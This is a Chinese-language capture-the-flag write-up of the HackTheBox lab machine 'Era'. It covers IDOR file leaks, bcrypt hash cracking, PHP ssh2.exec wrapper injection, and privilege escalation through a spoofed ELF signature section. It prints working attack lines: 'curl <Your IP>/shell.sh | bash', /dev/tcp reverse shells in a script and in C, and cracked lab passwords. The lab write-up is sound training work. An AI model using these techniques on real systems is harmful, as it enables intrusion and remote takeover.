{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Era","contentHtml":"<h1>Season8 - Era</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Era\">https://app.hackthebox.com/machines/Era</a> | <code>Linux</code> | <code>Medium</code></p>\n</blockquote>\n<h2>Recon</h2>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image.png\" alt=\"image.png\"></p>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Era nmap -sT -min-rate 5000 -p- 10.10.11.79\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 20:13 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.79\nHost is up (0.071s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n21/tcp open  ftp\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.97 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Era nmap -sT -A -p 21,80 10.10.11.79          \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 20:14 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.79\nHost is up (0.070s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.5\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://era.htb/\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   63.02 ms 10.10.14.1\n2   63.04 ms 10.10.11.79\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 12.79 seconds\n</code></pre>\n<h3>枚举</h3>\n<p>FTP 匿名测试</p>\n<pre><code class=\"hljs language-bash\">➜  Era ftp anonymous@10.10.11.79   \nConnected to 10.10.11.79.\n220 (vsFTPd 3.0.5)\n331 Please specify the password.\n</code></pre>\n<p><code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image1.png\" alt=\"image.png\"></p>\n<p>主页中没发现什么信息，爆破一下子域名</p>\n<pre><code class=\"hljs language-bash\">➜  Era ffuf -u http://era.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class=\"hljs-string\">'host:FUZZ.era.htb'</span> --<span class=\"hljs-built_in\">fc</span>=302\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://era.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.era.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 302\n________________________________________________\n\nfile                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 61ms]\n:: Progress: [114442/114442] :: Job [1/1] :: 709 req/sec :: Duration: [0:03:19] :: Errors: 0 ::\n</span></code></pre>\n<p>访问 <code>file.era.htb</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image2.png\" alt=\"image.png\"></p>\n<p>只有登录页但是没找到注册页面，进行目录爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Era gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://file.era.htb --exclude-length 6765             \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://file.era.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] Exclude Length:          6765\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 178] [--> http://file.era.htb/images/]\n/download.php         (Status: 302) [Size: 0] [--> login.php]\n/login.php            (Status: 200) [Size: 9214]\n/register.php         (Status: 200) [Size: 3205]\n/files                (Status: 301) [Size: 178] [--> http://file.era.htb/files/]\n/assets               (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]\n/upload.php           (Status: 302) [Size: 0] [--> login.php]\n/layout.php           (Status: 200) [Size: 0]\n/manage.php           (Status: 302) [Size: 0] [--> login.php]                                                                                                                                   \n/LICENSE              (Status: 200) [Size: 34524]                                                                                                                                               \n/reset.php            (Status: 302) [Size: 0] [--> login.php] \n</code></pre>\n<p>能找到 <code>register.php</code> ，注册用户 <code>sunset</code></p>\n<p>进入后台</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image3.png\" alt=\"image.png\"></p>\n<p>有个 更新安全问题的选项，主页中有一个可以根据安全问题来进行登录，但是我们不知道别的用户名也无济于事</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image4.png\" alt=\"image.png\"></p>\n<p>还存在文件上传功能点</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image5.png\" alt=\"image.png\"></p>\n<h2>文件泄露</h2>\n<p>上传文件之后，可以看到是由 <code>ID</code> 调用的</p>\n<p>我们尝试一下爆破下 <code>ID</code></p>\n<pre><code class=\"hljs language-bash\">➜  Era ffuf -u <span class=\"hljs-string\">'http://file.era.htb//download.php?id=FUZZ&#x26;dl=true'</span> -H <span class=\"hljs-string\">'Cookie: PHPSESSID=o4p7som9puj73tm9a8mc9qgusa'</span> -w num --fs=7686\n\n        /<span class=\"hljs-string\">'___\\  /'</span>___\\           /<span class=\"hljs-string\">'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://file.era.htb//download.php?id=FUZZ&#x26;dl=true\n :: Wordlist         : FUZZ: /root/Desktop/HackTheBox/Era/num\n :: Header           : Cookie: PHPSESSID=o4p7som9puj73tm9a8mc9qgusa\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 7686\n________________________________________________\n\n150                     [Status: 200, Size: 2746, Words: 12, Lines: 9, Duration: 114ms]\n54                      [Status: 200, Size: 2006697, Words: 7361, Lines: 7445, Duration: 89ms]\n2517                    [Status: 200, Size: 5492, Words: 701, Lines: 192, Duration: 72ms]\n2528                    [Status: 200, Size: 21, Words: 3, Lines: 2, Duration: 80ms]\n6660                    [Status: 200, Size: 158, Words: 5, Lines: 3, Duration: 68ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 598 req/sec :: Duration: [0:00:22] :: Errors: 0 ::\n</span></code></pre>\n<p>其中一些是用户上传的，<code>54</code>是我们想要的</p>\n<pre><code class=\"hljs language-bash\">➜  Era curl <span class=\"hljs-string\">'http://file.era.htb//download.php?id=54&#x26;dl=true'</span> -H <span class=\"hljs-string\">'Cookie: PHPSESSID=o4p7som9puj73tm9a8mc9qgusa'</span> --output site-backup-30-08-24.zip\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 1959k    0 1959k    0     0  2302k      0 --:--:-- --:--:-- --:--:-- 2302k\n</code></pre>\n<p>解压出来后是网站的源代码</p>\n<pre><code class=\"hljs language-bash\">➜  Era <span class=\"hljs-built_in\">ls</span>\nbg.jpg        filedb.sqlite         index.php           layout.php  logout.php  register.php  screen-download.png  screen-manage.png   upload.php\ncss           files                 initial_layout.php  LICENSE     main.png    reset.php     screen-login.png     screen-upload.png   webfonts\ndownload.php  functions.global.php  layout_login.php    login.php   manage.php  sass          screen-main.png      security_login.php\n</code></pre>\n<p>还注意到存在 <code>filedb.sqlite</code> ，使用 <code>sqlite</code>打开</p>\n<pre><code class=\"hljs language-bash\">sqlite> .tables\nfiles  <span class=\"hljs-built_in\">users</span>\nsqlite> <span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;\n1|admin_ef01cab31aa|$2y$10<span class=\"hljs-variable\">$wDbohsUaezf74d3sMNRPi</span>.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa\n2|eric|$2y$10<span class=\"hljs-variable\">$S9EOSDqF1RzNUvyVj7OtJ</span>.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||\n3|veronica|$2y$10<span class=\"hljs-variable\">$xQmS7JL8UT4B3jAYK7jsNeZ4I</span>.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||\n4|yuri|$2b$12<span class=\"hljs-variable\">$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2</span>.|-1|||\n5|john|$2a$10<span class=\"hljs-variable\">$iccCEz6</span>.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||\n6|ethan|$2a$10<span class=\"hljs-variable\">$PkV</span>/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||\n</code></pre>\n<p>得到好几组加密的凭据，我们其进行处理</p>\n<pre><code class=\"hljs language-bash\">➜  Era <span class=\"hljs-built_in\">cat</span> raw                                                                      \n1|admin_ef01cab31aa|$2y$10<span class=\"hljs-variable\">$wDbohsUaezf74d3sMNRPi</span>.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa\n2|eric|$2y$10<span class=\"hljs-variable\">$S9EOSDqF1RzNUvyVj7OtJ</span>.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||\n3|veronica|$2y$10<span class=\"hljs-variable\">$xQmS7JL8UT4B3jAYK7jsNeZ4I</span>.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||\n4|yuri|$2b$12<span class=\"hljs-variable\">$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2</span>.|-1|||\n5|john|$2a$10<span class=\"hljs-variable\">$iccCEz6</span>.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||\n6|ethan|$2a$10<span class=\"hljs-variable\">$PkV</span>/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||\n\n➜  Era <span class=\"hljs-built_in\">cat</span> raw | awk -F <span class=\"hljs-string\">'|'</span> <span class=\"hljs-string\">'{print $2\":\"$3}'</span> > <span class=\"hljs-built_in\">hash</span>\n</code></pre>\n<p>进行爆破</p>\n<pre><code class=\"hljs language-bash\">➜  Era john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>\nUsing default input encoding: UTF-8\nLoaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])\nLoaded hashes with cost 1 (iteration count) varying from 1024 to 4096\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\namerica          (eric)     \nmustang          (yuri) \n</code></pre>\n<p>拿到凭据后去测试 <code>FTP</code></p>\n<p>最后使用 <code>yuri</code> 的账户能成功进入</p>\n<pre><code class=\"hljs language-bash\">➜  Era ftp yuri@10.10.11.79\nConnected to 10.10.11.79.\n220 (vsFTPd 3.0.5)\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system <span class=\"hljs-built_in\">type</span> is UNIX.\n</code></pre>\n<p>能扒拉出不少文件</p>\n<h2>代码审计</h2>\n<p>在 <code>download.php</code> 中，我们可以发现一段注释写着”目前仅供管理员使用”</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image6.png\" alt=\"image.png\"></p>\n<p>这里使用<code>AI</code> 进行分析：</p>\n<p>这部分代码包含一个典型且极其严重的安全漏洞。这是一个 PHP 流封装协议注入（PHP Stream Wrapper Injection）漏洞：</p>\n<ol>\n<li>\n<p>攻击者通过 URL 完全控制 <code>format</code> 参数</p>\n</li>\n<li>\n<p>代码检查 <code>format</code> 是否包含 <code>://</code></p>\n<p>然而，它非但没有阻止这个输入，反而将用户提供的整个字符串赋值给了 <code>$wrapper</code> 变量。这是致命的缺陷。 开发者的本意可能并非如此，但实现方式导致了漏洞</p>\n</li>\n<li>\n<p>用户可控的 <code>$wrapper</code> 被直接拼接到文件名 <code>$file</code> 的前面，然后这个结果被传递给了 <code>fopen()</code> 函数。PHP 中的 <code>fopen()</code> 函数功能异常强大，因为它能理解“PHP 流封装协议（Stream Wrappers）”</p>\n</li>\n</ol>\n<p>但是我们测试这个漏洞的前提是我们得先拥有管理员后台</p>\n<h2>IDOR</h2>\n<p>我们回到后台中，因为我们知道了管理员账户的用户名</p>\n<p>我们尝试在随意一个用户的后台中更新管理账户的安全问题</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image7.png\" alt=\"image.png\"></p>\n<p>点击 <code>update</code> 竟然提示更新成功了</p>\n<p>然后我们来到主页点击使用 “<code>Login using security questions</code>”</p>\n<p>输入刚刚更新问题就能进入管理员的后台</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image8.png\" alt=\"image.png\"></p>\n<h2>验证漏洞</h2>\n<p>首先漏洞要满足条件，<code>ID</code> 是数字并且是存在的，并且<code>show</code> 为 <code>true</code> ，使用管理员账户进行登录</p>\n<p>但是下载文件时会将 <code>ID</code> 的文件名拼接上去</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$file_content</span> = fopen(<span class=\"hljs-variable\">$wrapper</span> ? <span class=\"hljs-variable\">$wrapper</span> . <span class=\"hljs-variable\">$file</span> : <span class=\"hljs-variable\">$file</span>, <span class=\"hljs-string\">'r'</span>);\n</code></pre>\n<p>假如我们输入 <code>php://filter/read=convert.base64-encode/resource=/etc/passwd</code></p>\n<p>就会变成 <code>php://filter/read=convert.base64-encode/resource=/etc/passwdfiles/xxx</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image9.png\" alt=\"image.png\"></p>\n<p>这里我尝试了一下无法进行 <code>LFI</code> ，也可能是没有回显</p>\n<p>找到一个 <code>PHP</code> 的<code>SSH</code> <code>Warppers</code></p>\n<blockquote>\n<p><a href=\"https://www.php.net/manual/en/wrappers.ssh2.php\">https://www.php.net/manual/en/wrappers.ssh2.php</a></p>\n</blockquote>\n<p>我们可以尝试使用上面的得到的用户进行尝试</p>\n<pre><code class=\"hljs language-bash\">ssh2.exec://yuri:mustang@127.0.0.1:22/curl+&#x3C;Your IP>/\nssh2.exec://eric:america@127.0.0.1:22/curl+&#x3C;Your IP>/\n</code></pre>\n<p>使用 <code>eric:america</code> 的凭据可以成功执行 <code>SSRF</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image10.png\" alt=\"image.png\"></p>\n<p>我们写一个反弹 <code>shell</code> 脚本然后让它读取然后执行</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\"># shell.sh</span>\n/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/&#x3C;Your IP>/1234 0>&#x26;1'</span>\n</code></pre>\n<p>开启服务器，在 <code>URL</code> 上输入如下命令</p>\n<pre><code class=\"hljs language-bash\">ssh2.exec://eric:america@127.0.0.1:22/curl+&#x3C;Your IP>/shell.sh+|bash;\n</code></pre>\n<p>成功接收到 <code>shell</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image11.png\" alt=\"image.png\"></p>\n<p>该用户可以读取 <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">eric@era:~$ <span class=\"hljs-built_in\">cat</span> user.txt \nd06xxxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>权限提升</h2>\n<p>上边 <code>id</code> 的时候能注意到我们属于 <code>devs</code>组</p>\n<pre><code class=\"hljs language-bash\">eric@era:~$ <span class=\"hljs-built_in\">id</span>\nuid=1000(eric) gid=1000(eric) <span class=\"hljs-built_in\">groups</span>=1000(eric),1001(devs)\n</code></pre>\n<p><code>Linpeas</code> 枚举，有几个 <code>devs</code> 组可以读取的文件</p>\n<pre><code class=\"hljs language-bash\">1220  ╔══════════╣ Readable files belonging to root and readable by me but not world readable \n  1221  -rw-r----- 1 root eric 33 Jul 29 03:11 /home/eric/user.txt                              \n  1222  -rwxrw---- 1 root devs 16544 Jul 29 04:07 /opt/AV/periodic-checks/monitor               \n  1223  -rw-rw---- 1 root devs 205 Jul 29 04:07 /opt/AV/periodic-checks/status.log\n</code></pre>\n<p>文件夹信息</p>\n<pre><code class=\"hljs language-bash\">eric@era:/opt/AV/periodic-checks$ <span class=\"hljs-built_in\">ls</span> -la\ntotal 32\ndrwxrwxr-- 2 root devs  4096 Jul 29 04:53 .\ndrwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..\n-rwxrw---- 1 root devs 16544 Jul 29 04:53 monitor\n-rw-rw---- 1 root devs   307 Jul 29 04:53 status.log\n\neric@era:/opt/AV$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 12\ndrwxrwxr-- 3 root devs 4096 Jul 22 08:42 .\ndrwxrwxr-x 3 root root 4096 Jul 22 08:42 ..\ndrwxrwxr-- 2 root devs 4096 Jul 29 04:54 periodic-checks\n</code></pre>\n<p>名字是 <code>periodic-checks</code> 定期检查，上传 <code>pspy</code> 看看</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image12.png\" alt=\"image.png\"></p>\n<p>能看到有定时任务在执行，并且会使用 <code>objcopy</code> 从 <code>/opt/AV/periodic-checks/monitor</code> 这个可执行文件中，提取一个名为 <code>.text_sig</code> 的区段（section），并将其内容转储到一个名为 <code>text_sig_section.bin</code> 的新文件中</p>\n<p><code>monitor</code> 可执行文件很简单</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image13.png\" alt=\"image.png\"></p>\n<p>并且我们对其有权限，我们可以替换它</p>\n<p>首先写一个反弹 <code>shell</code> 功能的 <code>C</code> 语言文件</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-comment\">#include &#x3C;stdlib.h></span>\n\nint <span class=\"hljs-function\"><span class=\"hljs-title\">main</span></span>() {\n    system(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/&#x3C;Your IP>/4444 0>&#x26;1'\"</span>);\n    <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p>生成 <code>ELF</code> 文件</p>\n<pre><code class=\"hljs language-bash\">eric@era:/tmp$ gcc -o shell shell.c \n</code></pre>\n<p>替换文件</p>\n<pre><code class=\"hljs language-bash\">eric@era:/tmp$ <span class=\"hljs-built_in\">cp</span> <span class=\"hljs-built_in\">bg</span> /opt/AV/periodic-checks/monitor\n</code></pre>\n<p>我们观察 <code>pspy</code> 和 监听的端口，但是 <code>pspy</code> 上显示执行后，并没有将 <code>shell</code> 弹过来</p>\n<p>可能是脚本中处理或需要验证<code>.text_sig</code> 字段，所以尝试将原本的<code>monitor</code>中的<code>.text_sig</code> 复制到我们的 <code>shell</code> 中</p>\n<pre><code class=\"hljs language-bash\">readelf -S monitor\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/image14.png\" alt=\"image.png\"></p>\n<p>我们将原本的 <code>monitor</code> 的 <code>.text_sig dump</code> 下来</p>\n<pre><code class=\"hljs language-bash\">➜  Era objcopy --dump-section .text_sig=sig monitor\n</code></pre>\n<p>再添加到我们的 <code>shell</code> 上边</p>\n<pre><code class=\"hljs language-bash\">➜  Era objcopy --add-section .text_sig=sig shell\n</code></pre>\n<p>这里可以运行 <code>readelf</code> 查看是否添加了上去</p>\n<p>然后我们再使用 <code>shell</code> 替换掉 <code>monitor</code> 即可</p>\n<p>等待运行即可将 <code>shell</code> 弹回来</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Era/images15.jpg\" alt=\"image.png\"></p>\n<h2>总结</h2>\n<p>没耐心，没耐心，不知道为什么在 web 模块的时候就是没有耐心</p>\n<p>代码审计一开始就只看了 upload 和 数据库文件，并没有看 donwload，所以错过了</p>\n<p>这是检查的脚本，只是用 <code>grep</code> 来检查<code>.text_sig</code>  是否存在某些字符串</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-meta\">#!/bin/bash</span>\n\n<span class=\"hljs-comment\"># Paths</span>\nBINARY=<span class=\"hljs-string\">\"/opt/AV/periodic-checks/monitor\"</span>\nSECTION=<span class=\"hljs-string\">\".text_sig\"</span>\nEXTRACTED_SECTION=<span class=\"hljs-string\">\"text_sig_section.bin\"</span>\nORGANIZATION=<span class=\"hljs-string\">\"Era Inc.\"</span>\nEMAIL=<span class=\"hljs-string\">\"yurivich@era.com\"</span>\n\n<span class=\"hljs-comment\"># Extract the .text_sig section</span>\nobjcopy --dump-section <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$SECTION</span>\"</span>=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EXTRACTED_SECTION</span>\"</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$BINARY</span>\"</span>\n\n<span class=\"hljs-comment\"># Parse the ASN.1 structure</span>\nOUTPUT=$(openssl asn1parse -inform DER -<span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EXTRACTED_SECTION</span>\"</span> 2>/dev/null)\n\n<span class=\"hljs-keyword\">if</span> [[ $? -ne 0 ]]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[ERROR] Executable not signed. Tampering attempt detected. Skipping.\"</span>\n    <span class=\"hljs-built_in\">rm</span> -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EXTRACTED_SECTION</span>\"</span>\n    <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n\n<span class=\"hljs-comment\"># Check for the organization name</span>\nORG_CHECK=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$OUTPUT</span>\"</span> | grep -oP <span class=\"hljs-string\">\"(?&#x3C;=UTF8STRING        :)<span class=\"hljs-variable\">$ORGANIZATION</span>\"</span>)\n\n<span class=\"hljs-comment\"># Check for the email address</span>\nEMAIL_CHECK=$(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$OUTPUT</span>\"</span> | grep -oP <span class=\"hljs-string\">\"(?&#x3C;=IA5STRING         :)<span class=\"hljs-variable\">$EMAIL</span>\"</span>)\n\n<span class=\"hljs-comment\"># Decision logic</span>\n<span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$ORG_CHECK</span>\"</span> == <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$ORGANIZATION</span>\"</span> &#x26;&#x26; <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EMAIL_CHECK</span>\"</span> == <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EMAIL</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span>\n    <span class=\"hljs-variable\">$BINARY</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[SUCCESS] No threats detected.\"</span>\n    ALLOW=1\n<span class=\"hljs-keyword\">else</span>\n    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"[FAILURE] Binary has been tampered with. Skipping.\"</span>\n    ALLOW=0\n<span class=\"hljs-keyword\">fi</span>\n\n<span class=\"hljs-comment\"># Cleanup</span>\n<span class=\"hljs-built_in\">rm</span> -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$EXTRACTED_SECTION</span>\"</span>\n\n<span class=\"hljs-comment\"># Exit with appropriate status</span>\n<span class=\"hljs-built_in\">exit</span> <span class=\"hljs-variable\">$ALLOW</span>\n</code></pre>","title":"HackTheBox - Season8 - Era","date":"2025-07-29","updated":"2025-07-29","tags":["HackTheBox","IDOR","Code","PHP_Warrpers","php_ssh2","Hijack","encrypt"],"categories":"靶机","comments":true,"description":"Season8 - Era\n\n https://app.hackthebox.com/machines/Era | `Linux` | `Medium`\n \n\nRecon\n\n\n\nPortScan\n\n\n\n\n\n枚举\n\nFTP 匿名测试\n\n\n\n`HTTP` 服务\n\n\n\n主页中没发现什么信息，爆破一下子域名\n\n\n\n访问 `file.era.htb`\n\n\n\n只有登录页但是没找到注册页面，进行目录爆破\n\n\n\n...","isEncrypted":true},"recentPosts":[{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"},{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"}]},"__N_SSG":true}